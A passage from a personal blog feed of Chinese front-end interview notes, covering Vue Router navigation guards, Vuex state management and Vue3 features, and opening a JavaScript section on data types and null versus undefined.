传入错误的监听函数。（用来判断是否登录了，没登录就跳转到登录页）</p><p>afterEach 全局后置钩子，代表进入路由之后。（用来跳转之后滚动条回到顶部）</p><p>（2）单个路由独享钩子函数 <code>beforeEnter(to, from, next)</code>，它是在路由配置上直接进行定义的。</p><p>（3）组件内导航钩子函数：<code>beforeRouteEnter</code>、<code>beforeRouteUpdate</code>、<code>beforeRouteLeave</code>。它们是直接在路由组件内部进行定义的，这三个钩子都有三个参数∶to、from、next</p><ul><li>beforeRouteEnter∶ 进入组件前触发</li><li>beforeRouteUpdate∶ 当前地址改变并且该组件被复用时触发。举例来说，带有动态参数的路径foo/∶id，在 /foo/1 和 /foo/2 之间跳转的时候，由于会渲染同样的foa组件，这个钩子在这种情况下就会被调用</li><li>beforeRouteLeave∶ 离开组件被调用</li></ul><h3 id="触发钩子的完整顺序"><a href="#触发钩子的完整顺序" class="headerlink" title="触发钩子的完整顺序"></a>触发钩子的完整顺序</h3><p>路由导航、keep-alive、和组件生命周期钩子结合起来的，触发顺序，假设是从a组件离开，第一次进入b组件∶</p><ul><li>beforeRouteLeave：路由组件的组件离开路由前钩子，可取消路由离开。</li><li>beforeEach：路由全局前置守卫，可用于登录验证、全局路由loading等。</li><li>beforeEnter：路由独享守卫</li><li>beforeRouteEnter：路由组件的组件进入路由前钩子。</li><li>beforeResolve：路由全局解析守卫</li><li>afterEach：路由全局后置钩子</li><li>beforeCreate：组件生命周期，不能访问tAis。</li><li>created;组件生命周期，可以访问tAis，不能访问dom。</li><li>beforeMount：组件生命周期</li><li>deactivated：离开缓存组件a，或者触发a的beforeDestroy和destroyed组件销毁钩子。</li><li>mounted：访问/操作dom。</li><li>activated：进入缓存组件，进入a的嵌套子组件（如果有的话）。</li><li>执行beforeRouteEnter回调函数next。</li></ul><ol><li>导航行为被触发到导航完成的整个过程</li></ol><ul><li>导航行为被触发，此时导航未被确认。</li><li>在失活的组件里调用离开守卫 beforeRouteLeave。</li><li>调用全局的 beforeEach守卫。</li><li>在重用的组件里调用 beforeRouteUpdate 守卫(2.2+)。</li><li>在路由配置里调用 beforeEnteY。</li><li>解析异步路由组件（如果有）。</li><li>在被激活的组件里调用 beforeRouteEnter。</li><li>调用全局的 beforeResolve 守卫（2.5+），标示解析阶段完成。</li><li>导航被确认。</li><li>调用全局的 afterEach 钩子。</li><li>非重用组件，开始组件实例的生命周期：beforeCreate&amp;created、beforeMount&amp;mounted</li><li>触发 DOM 更新。</li><li>用创建好的实例调用 beforeRouteEnter守卫中传给 next 的回调函数。</li><li>导航完成</li></ul><h2 id="Vue-中-route-和-router-的区别？"><a href="#Vue-中-route-和-router-的区别？" class="headerlink" title="Vue 中 $route 和 $router 的区别？"></a>Vue 中 $route 和 $router 的区别？</h2><p>具体见<a href="https://segmentfault.com/a/1190000022666268">vue中 $router 和 $route 的区别</a>。</p><ul><li>$route：当前激活路由的信息对象。每个对象都是局部的，可以获取当前路由的 path, name, params, query 等路由信息参数。</li><li>$router：全局的 router 实例。通过 vue 根实例中注入 router 实例，然后再注入到每个子组件，从而让整个应用都有路由功能。其中包含了很多属性和对象（比如 history 对象），任何页面也都可以调用其 push(), replace(), go() 等方法。</li></ul><h2 id="如何设置路由使不能匹配的url跳转到404页面"><a href="#如何设置路由使不能匹配的url跳转到404页面" class="headerlink" title="如何设置路由使不能匹配的url跳转到404页面"></a>如何设置路由使不能匹配的url跳转到404页面</h2><p>参考自 <a href="https://juejin.cn/post/6844903608140431368">https://juejin.cn/post/6844903608140431368</a></p><p><strong>SPA的404路由配置：</strong></p><p>路由表固定时，只需要在路由表中添加一个路径为<code>404</code>的路由，同时<strong>在路由表的最底部</strong>配置一个路径为*的路由，重定向至404路由。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// router.js</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">new</span> Router(&#123;</span><br><span class="line">  <span class="attr">mode</span>: <span class="string">&#x27;history&#x27;</span>,</span><br><span class="line">  <span class="attr">routes</span>: [</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">name</span>: <span class="string">&#x27;404&#x27;</span>,</span><br><span class="line">      <span class="attr">path</span>: <span class="string">&#x27;/404&#x27;</span>,</span><br><span class="line">      <span class="attr">component</span>: <span class="function">() =&gt;</span> <span class="keyword">import</span>(<span class="string">&#x27;@/views/notFound.vue&#x27;</span>)</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">path</span>: <span class="string">&#x27;*&#x27;</span>,    <span class="comment">// 此处需特别注意至于最底部</span></span><br><span class="line">      <span class="attr">redirect</span>: <span class="string">&#x27;/404&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">  ],</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h1 id="Vuex"><a href="#Vuex" class="headerlink" title="Vuex"></a>Vuex</h1><p>部分参考<a href="https://juejin.cn/post/6844903993374670855">https://juejin.cn/post/6844903993374670855</a></p><h2 id="Vuex-原理"><a href="#Vuex-原理" class="headerlink" title="Vuex 原理"></a>Vuex 原理</h2><p>Vuex 是一个专为 Vue.js 应用程序开发的状态管理模式，采用集中式存储管理应用所有组件的状态，主要是为了多页面、多组件之间的通信。每一个 Vuex 应用的<strong>核心就是 store</strong>（仓库）。</p><ul><li>Vuex 的状态存储是响应式的。当 Vue 组件从 store 中读取状态的时候，若 store 中的状态发生变化，那么相应的组件也会相应地得到高效更新。</li><li>改变 store 中的状态的唯一途径就是显式地提交 mutation：<code>this.$store.commit(&#39;Function&#39;, video_pause)</code>，这样可以方便地跟踪每一个状态的变化。</li></ul><p><img src="https://i.loli.net/2021/11/22/nUyl5A1ruR7kZz8.png" alt="image.png"></p><ul><li>Vue Components 是 vue 组件，组件会<strong>触发（dispatch）</strong>一些事件或动作，也就是图中的 Actions;</li><li>在组件中发出的动作，肯定是想获取或者改变数据的，但是在 vuex 中，数据是集中管理的，不能直接去更改数据，所以会把这个动作<strong>提交（Commit）</strong>到 Mutations 中;</li><li>然后 Mutations 就去<strong>改变（Mutate）</strong>State 中的数据;</li><li>当 State 中的数据被改变之后，就会重新<strong>渲染（Render）</strong>到 Vue Components 中去，组件展示更新后的数据，完成一个流程。</li></ul><h2 id="Vuex-核心概念"><a href="#Vuex-核心概念" class="headerlink" title="Vuex 核心概念"></a>Vuex 核心概念</h2><ul><li><code>Vue Components</code>∶ Vue组件。HTML页面上，负责接收用户操作等交互行为，执行dispatch方法触发对应action进行回应。</li><li><code>dispatch</code>∶操作行为触发方法，是唯一能执行action的方法。</li><li><code>commit</code>∶状态改变提交操作方法。对mutation进行提交，是唯一能执行mutation的方法。</li></ul><p><strong>Vuex 的五种属性？</strong></p><ul><li><code>actions</code>∶ 操作行为处理模块。负责处理Vue Components接收到的所有交互行为。包含<strong>同步/异步</strong>操作，支持多个同名方法，按照注册的顺序依次触发。向后台API请求的操作就在这个模块中进行，包括触发其他action以及提交mutation的操作。该模块提供了Promise的封装，以支持action的链式触发。（像一个装饰器，包裹mutations，使之可以异步。）</li><li><code>mutations</code>∶状态改变操作方法。是Vuex修改state的唯一推荐方法，其他修改方式在严格模式下将会报错，该方法名只能全局唯一。（this.$store.commit( “xxx” )赋值， 更改 state 方法，只能是<strong>同步</strong>操作）</li><li><code>state</code>∶ <strong>页面状态管理容器对象</strong>。集中存储Vuecomponents中data对象的零散数据，全局唯一，以进行统一的状态管理。页面显示所需的数据从该对象中进行读取，利用Vue的细粒度数据响应机制来进行高效的状态更新。（this.$store.state.xxx 取值，包含了 store 中存储的各个状态）</li><li><code>getters</code>∶ state对象读取方法。图中没有单独列出该模块，应该被包含在了render中，Vue Components通过该方法读取全局state对象。（this.$store.getters.xxx 取值）</li><li><code>Module</code>：模块化Vuex。通过Vue.set 动态添加 state 到响应式数据中</li></ul><p>由 view 层发起一个 Action 给 Mutation，在 Mutation 中修改状态，返回新的状态，通过 Getter 暴露给 view 层的组件或者页面，页面监测到状态改变，于是更新页面。</p><h3 id="action-和-mutation-的区别"><a href="#action-和-mutation-的区别" class="headerlink" title="action 和 mutation 的区别"></a>action 和 mutation 的区别</h3><ul><li>action 提交的是 mutation，而不直接变更状态。mutation可以直接变更状态。</li><li>action 可以包含任意异步操作。mutation只能是同步操作。</li><li>提交方式不同，action 是用<code>this.$store.dispatch(&#39;ACTION_NAME&#39;,data)</code>来提交。mutation是用<code>this.$store.commit(&#39;SET_NUMBER&#39;,10)</code>来提交。</li><li>Mutation 的参数是 state，包含 store 中的数据；store 的参数是 context，是 state 的父级，包含 state、getters。</li></ul><h3 id="为什么使用-action-提交-mutation-变更状态？"><a href="#为什么使用-action-提交-mutation-变更状态？" class="headerlink" title="为什么使用 action 提交 mutation 变更状态？"></a>为什么使用 action 提交 mutation 变更状态？</h3><p>可以把各个请求放到对应的 actions 文件下，返回数据处理，再提交 mutation。这样 页面处理逻辑相对干净。</p><p>action 支持 commit 和 dispatch 两个方法，根据需求选择同步或异步提交。</p><p>action 提交方便问题查找，每一步都可以输出错误，直接提交则不便于问题追踪。</p><h3 id="为什么-mutation-不能做异步操作？"><a href="#为什么-mutation-不能做异步操作？" class="headerlink" title="为什么 mutation 不能做异步操作？"></a>为什么 mutation 不能做异步操作？</h3><p>Vuex中所有的状态更新的唯一途径都是 mutation，异步操作通过 Action 来提交 mutation 实现。</p><p>每个mutation执行完成后都会对应到一个新的状态变更，这样vue-devtools就可以打个快照存下来，然后就可以实现 time-travel 。如果mutation支持异步操作，就没有办法知道状态是何时更新的，无法很好的进行状态的追踪，给调试带来困难。</p><p>time-travel：由于所有的状态变更只能通过 <code>mutation</code> 状态，并且每次状态的改变都会生产一个全新的 <code>state</code> 对象。把每次变更的 <code>state</code> 对象事件都记录下来，展现出一个 <code>mutation</code> 列表，当想展现什么时间段的状态，只需要切换到那个时间段的 <code>state</code> 对象。</p><h3 id="如何组合使用多个-action"><a href="#如何组合使用多个-action" class="headerlink" title="如何组合使用多个 action?"></a>如何组合使用多个 action?</h3><p>参考自 <a href="https://blog.csdn.net/weixin_43974265/article/details/114138184">在vuex中组合使用多个action</a></p><p>业务逻辑场景：存在2个action，actionA和actionB，先执行完 actionA 才能执行 actionB。</p><p>（<code>$store.dispatch</code> 可以处理被触发的 action 的处理函数返回的 Promise，并且 <code>$store.dispatch</code> 仍旧返回 Promise）</p><ol><li><p>在组件里派发 action：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">this</span>.$store.dispatch(<span class="string">&#x27;actionA&#x27;</span>).then(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// 派发其它的 action，编写其它逻辑代码</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li><li><p>在另一个action中派发：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">actionB</span>(<span class="params">&#123;dispatch, commit&#125;</span>)</span> &#123;</span><br><span class="line">  <span class="comment">// then方法返回的是一个新的 Promise 实例，可以 return 出去，继续链式调用</span></span><br><span class="line">  <span class="keyword">return</span> dispatch(<span class="string">&#x27;actionA&#x27;</span>).then(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    commit(<span class="string">&#x27;someOtherMutation&#x27;</span>);  <span class="comment">// 在 actionA执行完成之后，再执行 actionB的代码</span></span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>使用 <code>async/await</code> 的写法：</strong></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">actions: &#123;</span><br><span class="line">  <span class="keyword">async</span> actionA (&#123; commit &#125;) &#123;</span><br><span class="line">    commit(<span class="string">&#x27;getData&#x27;</span>, <span class="keyword">await</span> getData())</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="keyword">async</span> actionB (&#123; dispatch, commit &#125;) &#123;</span><br><span class="line">    <span class="keyword">await</span> dispatch(<span class="string">&#x27;actionA&#x27;</span>) <span class="comment">// 等待 actionA 完成</span></span><br><span class="line">    commit(<span class="string">&#x27;getOtherData&#x27;</span>, <span class="keyword">await</span> getOtherData())</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h3 id="如何重复使用-mutation"><a href="#如何重复使用-mutation" class="headerlink" title="如何重复使用 mutation"></a>如何重复使用 mutation</h3><p>使用 mapMutations 辅助函数：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 组件中</span></span><br><span class="line"><span class="keyword">import</span> &#123; mapMutations &#125; <span class="keyword">from</span> <span class="string">&#x27;vuex&#x27;</span></span><br><span class="line"><span class="attr">methods</span>:&#123;</span><br><span class="line">    ...mapMutations(&#123;</span><br><span class="line">        <span class="attr">setNumber</span>:<span class="string">&#x27;SET_NUMBER&#x27;</span>,</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p>然后调用<code>this.setNumber(10)</code>相当调用<code>this.$store.commit(&#39;SET_NUMBER&#39;,10)</code></p><h2 id="Vuex-使用"><a href="#Vuex-使用" class="headerlink" title="Vuex 使用"></a>Vuex 使用</h2><p>参考自 <a href="https://segmentfault.com/a/1190000019077663">vuex 使用总结（详解）</a>。</p><p><strong>为什么使用？</strong></p><ul><li>由于传参的方法对于多层嵌套的组件将会非常繁琐，并且对于兄弟组件间的状态传递无能为力。因此经常采用父子组件直接引用或者通过事件来变更和同步状态的多份拷贝。<strong>这些模式非常脆弱，通常会导致代码无法维护。</strong></li><li>所以需要把组件的共享状态抽取出来，以一个全局单例模式管理。在这种模式下，组件树构成了一个巨大的”视图”，不管在树的哪个位置，任何组件都能获取状态或者触发行为。同时代码将会变得更结构化且易维护。</li></ul><p>如果不打算开发大型单页应用，应用够简单，最好不要使用 Vuex。一个简单的store 模式就足够了。但是如果需要构建一个中大型单页应用，Vuex 能够更好的帮助我们管理组件外部的状态，一般可以运用在购物车、登录状态、播放等场景中。</p><p>在 Vue 的单页面应用中使用时，需要使用<code>Vue.use(Vuex)</code>调用插件，并将其注入到Vue根实例中。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> Vuex <span class="keyword">from</span> <span class="string">&#x27;vuex&#x27;</span></span><br><span class="line">Vue.use(Vuex)</span><br><span class="line"><span class="keyword">const</span> store = <span class="keyword">new</span> Vuex.Store(&#123;</span><br><span class="line">  <span class="attr">state</span>: &#123;</span><br><span class="line">    <span class="attr">count</span>: <span class="number">0</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">getter</span>: &#123;</span><br><span class="line">    <span class="attr">doneTodos</span>: <span class="function">(<span class="params">state, getters</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> state.todos.filter(<span class="function"><span class="params">todo</span> =&gt;</span> todo.done)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">mutations</span>: &#123;</span><br><span class="line">    increment (state, payload) &#123;</span><br><span class="line">      state.count++</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">actions</span>: &#123;</span><br><span class="line">    <span class="function"><span class="title">addCount</span>(<span class="params">context</span>)</span> &#123;</span><br><span class="line">      <span class="comment">// 可以包含异步操作</span></span><br><span class="line">      <span class="comment">// context 是一个与 store 实例具有相同方法和属性的 context 对象</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">// 注入到根实例</span></span><br><span class="line"><span class="keyword">new</span> Vue(&#123;</span><br><span class="line">  <span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span><br><span class="line">  <span class="comment">// 把 store 对象提供给 “store” 选项，这可以把 store 的实例注入所有的子组件</span></span><br><span class="line">  store,</span><br><span class="line">  <span class="attr">template</span>: <span class="string">&#x27;&lt;App/&gt;&#x27;</span>,</span><br><span class="line">  <span class="attr">components</span>: &#123; App &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>然后改变状态：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">this</span>.$store.commit(<span class="string">&#x27;increment&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="Vuex-和-localStorage-的区别"><a href="#Vuex-和-localStorage-的区别" class="headerlink" title="Vuex 和 localStorage 的区别"></a>Vuex 和 localStorage 的区别</h2><p><strong>（1）最重要的区别</strong>：vuex 存储在内存中；localstorage 则以文件的方式存储在本地，只能存储字符串类型的数据，存储对象需要 JSON 的 stringify 和 parse 方法进行处理；读取内存比读取硬盘速度要快。</p><p><strong>（2）应用场景</strong>：Vuex 能做到数据的响应式，localstorage 不能。</p><p><strong>（3）永久性</strong>：刷新页面时 vuex 存储的值会丢失，localstorage不会。</p><p><strong>注意：</strong> 对于不变的数据确实可以用localstorage可以代替vuex，但是当两个组件共用一个数据源（对象或数组）时，如果其中一个组件改变了该数据源，希望另一个组件响应该变化时，localstorage无法做到</p><h2 id="有使用过-vuex-的-module-吗？主要是在什么场景下使用？"><a href="#有使用过-vuex-的-module-吗？主要是在什么场景下使用？" class="headerlink" title="有使用过 vuex 的 module 吗？主要是在什么场景下使用？"></a>有使用过 vuex 的 module 吗？主要是在什么场景下使用？</h2><p>由于使用单一状态树，应用的所有状态会集中到一个比较大的对象。当应用变得非常复杂时，store 对象就有可能变得相当臃肿。</p><p>这时我们可以将 store 分割为<strong>模块（module）</strong>，每个模块拥有自己的 <code>state</code> 、 <code>getters</code> 、<code>mutations</code> 、<code>actions</code> 、甚至是嵌套子模块——从上至下进行同样方式的分割。</p><h2 id="Vuex-严格模式"><a href="#Vuex-严格模式" class="headerlink" title="Vuex 严格模式"></a>Vuex 严格模式</h2><p>在严格模式下，无论何时发生了状态变更且不是由mutation函数引起的，将会抛出错误。这能保证所有的状态变更都能被调试工具跟踪到。</p><p>在Vuex.Store 构造器选项中开启,如下</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> store = <span class="keyword">new</span> Vuex.Store(&#123;</span><br><span class="line">    <span class="attr">strict</span>:<span class="literal">true</span>,</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h1 id="Vue3"><a href="#Vue3" class="headerlink" title="Vue3"></a>Vue3</h1><p>具体见 <a href="https://juejin.cn/post/6951262189168623623#heading-1">https://juejin.cn/post/6951262189168623623#heading-1</a></p><h2 id="Vue3-的特点？"><a href="#Vue3-的特点？" class="headerlink" title="Vue3 的特点？"></a>Vue3 的特点？</h2><ul><li><p>节点打 Tag，更新页面时直接定位到动态节点，会跳过静态的div，节省效率。</p></li><li><p>Tree Shaking：按需加载</p></li><li><p>Better TypeScript Support：更好的支持TypeScript语法</p></li><li><p>响应式 Proxy</p></li><li><p>增加 Composition API：将组件属性暴露为函数，使得 Vue3 的开发风格更接近于原生 JavaScript，也使得 Vue3 更适合于 TypeScript 结合，带给开发者更多地灵活性。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">// Composition API 将组件属性暴露为函数，因此第一步是导入所需的函数</span><br><span class="line">import &#123; ref, computed, onMounted &#125; from &#x27;vue&#x27;</span><br><span class="line">export default &#123;</span><br><span class="line">    setup() &#123;</span><br><span class="line">    // 使用 ref 函数声明了称为 count 的响应属性，对应于Vue2中的data函数</span><br><span class="line">    const count = ref(0)</span><br><span class="line">    // Vue2中需要在methods option中声明的函数，现在直接声明</span><br><span class="line">    function increment() &#123;</span><br><span class="line">      count.value++</span><br><span class="line">    &#125;</span><br><span class="line">    // 对应于Vue2中的mounted声明周期</span><br><span class="line">    onMounted(() =&gt; console.log(&#x27;component mounted!&#x27;))</span><br><span class="line">    return &#123; count, increment &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></li></ul><h3 id="解释-tree-shaking？"><a href="#解释-tree-shaking？" class="headerlink" title="解释 tree-shaking？"></a>解释 tree-shaking？</h3><p>Tree shaking 是一种通过清除多余代码方式来优化项目打包体积的技术，只能在静态 modules 下工作。</p><p>ECMAScript 6 模块加载是静态的，因此整个依赖树可以被静态地推导出解析语法树，判断哪些模块和变量未被使用，从而删除对应代码。所以在 ES6 中使用 tree shaking 是非常容易的。</p><h2 id="vue3-与-vue2-区别？（高频）"><a href="#vue3-与-vue2-区别？（高频）" class="headerlink" title="vue3 与 vue2 区别？（高频）"></a>vue3 与 vue2 区别？（高频）</h2><p><strong>大的改动：</strong></p><ul><li>proxy 代替 Object.definePrototety 响应式系统</li><li>ts 代替 flow 类型检查</li><li>重构了目录结构，将代码主要分成三个独立的模块，更利于长期维护</li><li>重写 vdom，优化编译性能</li><li>支持 tree shaking</li><li>增加了 Composition API(setup)，让代码更易于维护</li></ul><p><strong>小的改动:</strong></p><ul><li>异步组件需要 defineAsyncComponent 方法来创建</li><li>v-model 用法</li><li>v-if 优先级高于 v-for</li><li>destroyed 生命周期选项被重命名为 unmounted</li><li>beforeDestroy 生命周期选项被重命名为 beforeUnmount</li><li>render函数默认参数createElement移除改为全局引入</li><li>组件事件现在需要在 emits 选项中声明</li></ul><p><strong>新特性：</strong></p><ul><li>组合式 API</li><li>Teleport</li><li>framents（组件支持多个根节点）</li><li>createRenderer（跨平台的自定义渲染器）</li></ul><h2 id="vue3-的-Composition-API"><a href="#vue3-的-Composition-API" class="headerlink" title="vue3 的 Composition API"></a>vue3 的 Composition API</h2><p>在 Vue3 Composition API 中，组件根据逻辑功能来组织的，一个功能所定义的所有 API 会放在一起（更加的高内聚，低耦合）。</p><p><img src="https://i.loli.net/2021/11/25/4D3PGhpcRVBme8T.png" alt="image.png"></p><p>与 Vue2 Options API 区别：</p><ul><li>在逻辑组织和逻辑复用方面，<code>Composition API</code>优于<code>Options API</code>，因为<code>Composition API</code>几乎是函数，会有更好的类型推断。</li><li><code>Composition API</code>对 <code>tree-shaking</code> 友好，代码也更容易压缩</li><li><code>Composition API</code>中见不到<code>this</code>的使用，减少了<code>this</code>指向不明的情况</li><li>如果是小型组件，可以继续使用<code>Options API</code>，也是十分友好的</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;本文是我在复习Vue，准备实习面试时整理的笔记，参考自一些已经整理好的博客：&lt;a href=&quot;https://github.com/Cavs</summary>
      
    
    
    
    <category term="面试准备" scheme="https://asura1211.github.io/categories/%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87/"/>
    
    
    <category term="Vue" scheme="https://asura1211.github.io/tags/Vue/"/>
    
  </entry>
  
  <entry>
    <title>【面试准备】— — JavaScript篇</title>
    <link href="https://asura1211.github.io/2021/07/03/%E3%80%90%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87%E3%80%91%E2%80%94%20%E2%80%94%20JavaScript%E7%AF%87/"/>
    <id>https://asura1211.github.io/2021/07/03/%E3%80%90%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87%E3%80%91%E2%80%94%20%E2%80%94%20JavaScript%E7%AF%87/</id>
    <published>2021-07-03T19:26:44.000Z</published>
    <updated>2021-12-07T12:19:06.844Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本文是我在复习JavaScript，准备实习面试时整理的笔记，部分面试题参考自周游学长的博客：<a href="https://github.com/CavsZhouyou/Front-End-Interview-Notebook/blob/master/JavaScript/JavaScript.md">JavaScript 面试知识点总结</a>，其他涉及到的优质博客也已附上链接，侵权删。</p><h1 id="JavaScript-基础知识"><a href="#JavaScript-基础知识" class="headerlink" title="JavaScript 基础知识"></a>JavaScript 基础知识</h1><h2 id="js-的基本数据类型？（高频）"><a href="#js-的基本数据类型？（高频）" class="headerlink" title="js 的基本数据类型？（高频）"></a>js 的基本数据类型？（高频）</h2><p>js 一共有七种基本数据类型，分别是 <strong>Undefined</strong>、<strong>Null</strong>、<strong>Boolean</strong>、<strong>Number</strong>、<strong>String</strong>，还有在 ES6 中新增的 <strong>Symbol</strong> 和 ES10 中新增的 <strong>BigInt</strong> 类型。</p><p>Symbol 代表创建后独一无二且不可变的数据类型，主要是为了解决可能出现的全局变量冲突的问题。</p><p>BigInt 是一种数字类型的数据，它可以表示任意精度格式的整数，使用 BigInt 可以安全地存储和操作大整数，即使这个数已经超出了 Number 能够表示的安全整数范围。</p><h3 id="判断类型的方法？（高频）"><a href="#判断类型的方法？（高频）" class="headerlink" title="判断类型的方法？（高频）"></a>判断类型的方法？（高频）</h3><p>参考自<a href="https://juejin.cn/post/6919805736734162952#heading-13">https://juejin.cn/post/6919805736734162952#heading-13</a></p><ol><li><p>typeof：</p><ul><li><p>适用于<strong>判断所有</strong>（除 null，返回 object）<strong>基础类型</strong></p></li><li><p>判断引用类型时，<strong>除了 function</strong>，全返回 object 类型</p></li></ul></li><li><p>instanceof：<strong>instanceof 操作符左边是一个对象，右边是一个构造函数，在左边对象的原型链上查找，直到找到右边构造函数的 prototype 属性就返回 true，或者查找到顶层 null，就返回 false。</strong> </p><ul><li>只能用来判断变量的原型链上是否有构造函数的 prototype 属性（两个对象是否属于原型链的关系），不一定能获取对象的具体类型<strong>（适合自定义对象，也可以用来检测原生对象）</strong></li><li>Instanceof 不适用判断原始类型的值，只能用于判断对象从属关系</li><li>Instanceof 无法判断 iframe</li></ul></li><li><p>constructor</p><ul><li><strong>基本能判断所有类型，除了 null 和 undefined（报错）。但是 constructor 容易被修改</strong></li><li>原理：每一个实例对象都可通过 constructor 来访问它的构造函数。<code>&#39;5&#39;.__proto__.constructor === String // true</code></li></ul></li><li><p>toString</p><ul><li><p><code>Object.prototype.toString</code> 方法返回对象的类型字符串，因此可用来判断一个值的类型。</p></li><li><p>每一个继承 Object 的对象都有 toString 方法，如果 toString 方法没有重写的话，会返回 [Object type]，其中 type 为对象的类型。但当除了 Object 类型的对象外，其他类型直接使用 toString 方法会返回都是内容的字符串，所以需要使用 call 或者 apply 改变 toString 方法的执行上下文。</p></li><li><p><strong>所有的数据类型都可以使用此方法进行检测，且非常精准</strong>（能判断 iframe）</p></li><li><p><strong>缺点：不能精准判断自定义对象</strong>，对于自定义对象只会返回 [object Object]</p></li></ul></li></ol><h4 id="typeof-和-instanceof-区别？"><a href="#typeof-和-instanceof-区别？" class="headerlink" title="typeof 和 instanceof 区别？"></a>typeof 和 instanceof 区别？</h4><p>typeof 并不能准确判断变量到底是什么类型：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typeof</span> <span class="literal">null</span> <span class="comment">// &#x27;object&#x27;</span></span><br><span class="line"><span class="keyword">typeof</span> [] <span class="comment">// &#x27;object&#x27;</span></span><br><span class="line"><span class="keyword">typeof</span> &#123;&#125; <span class="comment">// &#x27;object&#x27;</span></span><br></pre></td></tr></table></figure><p>想判断一个对象的正确类型，可以使用 <code>instanceof</code>，具体区别见上。</p><h4 id="typeof-NaN-的结果是什么？"><a href="#typeof-NaN-的结果是什么？" class="headerlink" title="typeof NaN 的结果是什么？"></a>typeof NaN 的结果是什么？</h4><p>NaN 意指“不是一个数字”，是一个“警戒值”，用于指出数字类型中的错误情况，即“执行数学运算没有成功，这是失败后返回的结果”。</p><p><code>typeof NaN; // &quot;number&quot;</code>  NaN 是一个特殊值，它和自身不相等，是<strong>唯一一个非自反</strong>的值。</p><h3 id="null-和-undefined-的区别？"><a href="#null-和-undefined-的区别？" class="headerlink" title="null 和 undefined 的区别？"></a>null 和 undefined 的区别？</h3><p>Undefined 和 Null 都是基本数据类型，都只有一个值，就是 undefined 和 null。</p><ul><li><p>undefined 代表的含义是未定义，null 代表的含义是空对象。一般变量声明了但还没有定义的时候会返回 undefined，null 主要用于赋值给一些可能会返回对象的变量作为初始化。</p></li><li><p>undefined 在 js 中不是一个保留字，这意味着我们可以使用 undefined 来作为一个变量名，这样的做法是非常危险的，它会影响我们对 undefined 值的判断。但是我们可以通过一些方法获得安全的 undefined 值，比如说 void 0。</p></li><li><p>当我们对两种类型使用 typeof 进行判断的时候，Null 类型化会返回 “object”，这是一个历史遗留的问题。当我们使用双等号对两种类型的值进行比较时会返回 true，使用三个等号时会返回 false。</p></li></ul><h3 id="如何获取安全的-undefined-值？"><a href="#如何获取安全的-undefined-值？" class="headerlink" title="*如何获取安全的 undefined 值？"></a>*如何获取安全的 undefined 值？</h3><p>因为 undefined 是一个标识符，所以可以被当作变量来使用和赋值，但是这样会影响 undefined 的正常判断。表达式 void ___ 没有返回值，因此返回结果是 undefined。所以可以<strong>用 void 0 来获得 undefined</strong>。</p><h3 id="undefined-与-undeclared-的区别？"><a href="#undefined-与-undeclared-的区别？" class="headerlink" title="*undefined 与 undeclared 的区别？"></a>*undefined 与 undeclared 的区别？</h3><p>已在作用域中声明但还没有赋值的变量，是 undefined。还没有在作用域中声明过的变量，是 undeclared 。</p><p>对于 undeclared 变量的引用，浏览器会报引用错误，如 ReferenceError: b is not defined 。但是我们可以使用 typeof 的安全防范机制来避免报错，因为对于 undeclared（或者 not defined ）变量，typeof 会返回 “undefined”。</p><h2 id="JavaScript-堆-栈？（高频）"><a href="#JavaScript-堆-栈？（高频）" class="headerlink" title="JavaScript 堆 栈？（高频）"></a>JavaScript 堆 